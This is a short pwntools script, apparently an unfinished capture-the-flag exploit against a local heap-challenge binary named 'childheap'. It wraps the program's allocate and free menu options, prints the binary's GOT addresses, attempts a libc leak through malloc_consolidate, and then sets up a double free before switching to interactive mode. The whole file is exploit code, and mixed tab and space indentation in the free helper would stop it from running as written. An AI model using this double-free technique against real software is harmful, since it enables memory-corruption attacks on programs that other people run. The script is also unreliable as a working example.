from pwn import *

def malloc(index, size,content):
	p.sendlineafter('> ','1')
	p.sendlineafter('index: ',str(index))
	p.sendlineafter('size: ',str(size))
	p.sendafter('content: ',str(content))		

def free(index):
	p.sendlineafter('> ','2')
        p.sendlineafter('index: ',str(index))

p = process('./childheap')
e = ELF("./childheap")
l = e.libc

for name,addr in e.got.items():
	log.info(name + ' : ' + hex(addr))

pause()
context.log_level = "debug"

### libc leak
malloc(0, 10, '1')
malloc(1, 10, '1')
free(0)
malloc(2, 0x7f, '1')
free(2) # malloc_consolidate()

malloc(0,10,' ')
malloc(1, 10, ' ') # fence
malloc(2, 10, ' ') # fence2

free(0)
free(1)
free(0)

p.interactive()

